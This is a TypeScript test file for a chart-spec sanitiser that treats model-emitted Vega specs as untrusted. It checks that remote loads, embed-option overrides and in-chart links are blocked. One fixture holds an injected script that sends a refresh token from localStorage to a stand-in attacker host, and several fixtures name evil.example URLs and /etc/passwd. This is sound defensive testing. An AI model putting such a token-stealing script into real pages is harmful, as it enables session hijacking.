/**
 * Security tests for chart specs emitted by the model.
 *
 * A spec is untrusted input. These tests pin down that nothing in a spec can
 * (a) change the vega-embed options we pass, (b) make the browser fetch an
 * attacker-chosen URL, or (c) place a clickable link inside the chart, while
 * ordinary inline-data charts keep working.
 */

import { describe, it, expect, beforeAll } from 'vitest';
import {
	sanitizeVegaSpec, UnsafeSpecError, blockedLoader, stripTooltipImage, embedChart, chartRows,
} from './vega';

const bar = () => ({
	$schema: 'https://vega.github.io/schema/vega-lite/v6.json',
	mark: 'bar',
	data: { values: [{ a: 'x', b: 1 }, { a: 'y', b: 2 }] },
	encoding: { x: { field: 'a', type: 'nominal' }, y: { field: 'b', type: 'quantitative' } },
});

// ── usermeta ────────────────────────────────────────────────────────────────

describe('usermeta.embedOptions cannot override our embed options', () => {
	it('removes usermeta entirely', () => {
		const spec = {
			...bar(),
			usermeta: {
				embedOptions: {
					actions: { source: true },
					sourceHeader: '<script>fetch("https://evil/?t="+opener.localStorage.asap_refresh_token)</script>',
					editorUrl: 'https://evil.example/editor',
					loader: { baseURL: 'https://evil.example/' },
				},
			},
		};
		const clean = sanitizeVegaSpec(spec);
		expect(clean).not.toHaveProperty('usermeta');
		expect(clean.mark).toBe('bar');
	});

	it('does not mutate the input spec', () => {
		const spec = { ...bar(), usermeta: { x: 1 }, encoding: { href: { field: 'a' } } };
		const before = JSON.stringify(spec);
		sanitizeVegaSpec(spec);
		expect(JSON.stringify(spec)).toBe(before);
	});
});

// ── Remote loads ────────────────────────────────────────────────────────────

describe('remote data loading is refused', () => {
	it.each([
		['vega-lite data.url', { ...bar(), data: { url: 'https://evil.example/?ctx=secret' } }],
		['vega-lite relative data.url', { ...bar(), data: { url: '/api/users/me' } }],
		['nested layer data.url', {
			$schema: 'https://vega.github.io/schema/vega-lite/v6.json',
			layer: [bar(), { ...bar(), data: { url: 'https://evil.example/x.json' } }],
		}],
		['lookup transform from url', {
			...bar(),
			transform: [{ lookup: 'a', from: { data: { url: 'https://evil.example/l.csv' }, key: 'a', fields: ['z'] } }],
		}],
		['vega data[].url', {
			$schema: 'https://vega.github.io/schema/vega/v6.json',
			data: [{ name: 'table', url: 'https://evil.example/d.json' }],
			marks: [],
		}],
		['image mark (string)', { ...bar(), mark: 'image', encoding: { url: { value: 'https://evil.example/p.png' } } }],
		['image mark (object)', { ...bar(), mark: { type: 'image', width: 10 } }],
		['vega image mark', {
			$schema: 'https://vega.github.io/schema/vega/v6.json',
			marks: [{ type: 'image', encode: { enter: { url: { value: 'https://evil.example/p.png' } } } }],
		}],
		['image mark inside a layer', {
			$schema: 'https://vega.github.io/schema/vega-lite/v6.json',
			layer: [bar(), { mark: { type: 'image' }, encoding: {} }],
		}],
	])('refuses %s', (_name, spec) => {
		expect(() => sanitizeVegaSpec(spec as Record<string, unknown>)).toThrow(UnsafeSpecError);
	});

	it('gives the user a readable reason', () => {
		expect(() => sanitizeVegaSpec({ ...bar(), data: { url: 'https://evil.example' } }))
			.toThrow(/inline data/);
	});

	it('does not confuse a data column named "url" with a remote load', () => {
		const spec = { ...bar(), data: { values: [{ a: 'x', url: 'https://archives.example/r/1' }] } };
		expect(() => sanitizeVegaSpec(spec)).not.toThrow();
		expect(sanitizeVegaSpec(spec).data).toEqual(spec.data);
	});

	it('leaves vega-lite datasets alone', () => {
		const spec = { ...bar(), data: { name: 'd' }, datasets: { d: [{ a: 'x', b: 1, url: 'z' }] } };
		expect(() => sanitizeVegaSpec(spec)).not.toThrow();
	});

	it('drops a $schema that does not point at vega.github.io', () => {
		const clean = sanitizeVegaSpec({ ...bar(), $schema: 'https://evil.example/schema.json' });
		expect(clean).not.toHaveProperty('$schema');
		expect(sanitizeVegaSpec(bar()).$schema).toBe(bar().$schema);
	});
});

// ── Links ───────────────────────────────────────────────────────────────────

describe('links inside charts are removed', () => {
	it('removes the href channel and mark.href', () => {
		const clean = sanitizeVegaSpec({
			...bar(),
			mark: { type: 'bar', href: 'https://evil.example' },
			encoding: { ...bar().encoding, href: { field: 'a' } },
		});
		expect(clean.mark).toEqual({ type: 'bar' });
		expect(clean.encoding).not.toHaveProperty('href');
		expect(clean.encoding).toHaveProperty('x');
	});

	it('removes href from vega encode blocks', () => {
		const clean = sanitizeVegaSpec({
			$schema: 'https://vega.github.io/schema/vega/v6.json',
			marks: [{ type: 'rect', encode: { update: { href: { value: 'https://evil.example' }, x: { value: 1 } } } }],
		}) as { marks: { encode: { update: Record<string, unknown> } }[] };
		expect(clean.marks[0].encode.update).toEqual({ x: { value: 1 } });
	});
});

// ── Belt and braces ─────────────────────────────────────────────────────────

describe('blocked loader', () => {
	it('refuses every kind of request', async () => {
		await expect(blockedLoader.load('https://evil.example')).rejects.toThrow(UnsafeSpecError);
		await expect(blockedLoader.sanitize('https://evil.example', { context: 'href' })).rejects.toThrow(UnsafeSpecError);
		await expect(blockedLoader.http('https://evil.example', {})).rejects.toThrow(UnsafeSpecError);
		await expect(blockedLoader.file('/etc/passwd')).rejects.toThrow(UnsafeSpecError);
	});
});

describe('tooltip image stripping', () => {
	it('removes image from an object tooltip value', () => {
		expect(stripTooltipImage({ title: 'T', image: 'https://evil.example/p.png', a: 1 })).toEqual({ title: 'T', a: 1 });
	});
	it('passes other values through', () => {
		expect(stripTooltipImage('x')).toBe('x');
		expect(stripTooltipImage([1, 2])).toEqual([1, 2]);
		expect(stripTooltipImage(null)).toBeNull();
	});
});

// ── Integration through vega-embed ──────────────────────────────────────────

describe('embedChart', () => {
	// jsdom has no canvas; Vega only uses it to measure text and falls back
	// to an estimate when getContext returns null. Stub it to keep stderr quiet.
	beforeAll(() => {
		HTMLCanvasElement.prototype.getContext = (() => null) as typeof HTMLCanvasElement.prototype.getContext;
	});

	it('renders an inline-data chart with no actions menu even when the spec asks for one', async () => {
		const el = document.createElement('div');
		document.body.appendChild(el);
		const spec = {
			...bar(),
			usermeta: { embedOptions: { actions: { source: true, export: true, compiled: true, editor: true } } },
		};
		const result = await embedChart(el, spec);
		try {
			expect(el.querySelector('svg')).not.toBeNull();
			expect(el.querySelector('details, .vega-actions')).toBeNull();
			expect(chartRows(spec, result)).toHaveLength(2);
		} finally {
			result.finalize();
			el.remove();
		}
	});

	it('rejects a remote-data spec before anything is fetched', async () => {
		const el = document.createElement('div');
		await expect(embedChart(el, { ...bar(), data: { url: 'https://evil.example/x.json' } }))
			.rejects.toThrow(UnsafeSpecError);
		expect(el.innerHTML).toBe('');
	});
});
